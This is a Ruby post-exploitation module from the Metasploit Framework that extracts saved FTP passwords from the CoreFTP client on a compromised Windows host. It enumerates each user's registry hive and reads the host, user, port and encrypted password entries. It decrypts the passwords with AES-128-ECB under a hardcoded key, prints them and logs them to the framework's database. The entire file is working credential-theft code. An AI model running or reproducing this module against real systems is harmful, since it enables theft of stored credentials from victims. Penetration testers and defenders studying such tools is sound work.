##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post
	include Msf::Post::Windows::Registry
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Gather CoreFTP Saved Password Extraction',
				'Description'   => %q{
					This module extracts saved passwords from the CoreFTP FTP client. These 
				passwords are stored in the registry. They are encrypted with AES-128-ECB. 
				This module extracts and decrypts these passwords.},
				'License'       => MSF_LICENSE,
				'Author'        => ['TheLightCosine <thelightcosine[at]gmail.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	def run
		registry_enumkeys('HKU').each do |k|
			next unless k.include? "S-1-5-21"
			next if k.include? "_Classes"
			print_status("Looking at Key #{k}")
			begin
				subkeys = registry_enumkeys("HKU\\#{k}\\Software\\FTPware\\CoreFTP\\Sites")
				if subkeys.empty? or subkeys.nil?
					print_status ("CoreFTP not installed for this user.")
					return
				end

				subkeys.each do |site|
					host = registry_getvaldata("HKU\\#{k}\\Software\\FTPware\\CoreFTP\\Sites\\#{site}", "Host")
					user = registry_getvaldata("HKU\\#{k}\\Software\\FTPware\\CoreFTP\\Sites\\#{site}", "User")
					port = registry_getvaldata("HKU\\#{k}\\Software\\FTPware\\CoreFTP\\Sites\\#{site}", "Port")
					epass = registry_getvaldata("HKU\\#{k}\\Software\\FTPware\\CoreFTP\\Sites\\#{site}", "PW")
					next if epass == nil or epass == ""
					pass = decrypt(epass)
					print_good("Host: #{host} Port: #{port} User: #{user}  Password: #{pass}")
					auth = 
						{
							:host => host, :port => port, :sname => 'ftp',
							:user => user, :pass => pass,
							:type => 'password', :active => true
						}
					report_auth_info(auth)
				end
			rescue
				print_status("Not Installed for this User or Cannot Access User SID: #{k}")
			end 
		end
	end

	def decrypt(encoded)
		cipher = [encoded].pack("H*")
		aes = OpenSSL::Cipher::Cipher.new("AES-128-ECB")
		aes.padding = 0
		aes.decrypt
		aes.key = "hdfzpysvpzimorhk"
		password = aes.update(cipher) + aes.final
		return password
	end
end
